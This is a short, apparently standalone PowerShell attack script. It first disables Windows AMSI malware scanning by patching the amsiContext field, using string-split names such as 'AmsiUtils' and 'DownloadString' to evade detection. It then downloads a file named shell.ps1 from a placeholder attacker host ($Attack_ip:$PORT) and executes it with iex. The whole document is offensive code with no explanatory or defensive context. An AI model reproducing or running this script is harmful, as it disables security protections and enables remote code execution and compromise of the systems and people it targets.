$a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils')
$b = $a.GetField('amsi'+[char]67+'ontext','NonPublic,Static')
$p = $b.GetValue($null)
[Int32[]]$patch = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $p, 1)

$wc = New-Object ('Net.Web'+'Client')
$code = $wc.('Down'+'loadString')('http://$Attack_ip:$PORT/shell.ps1')
iex $code
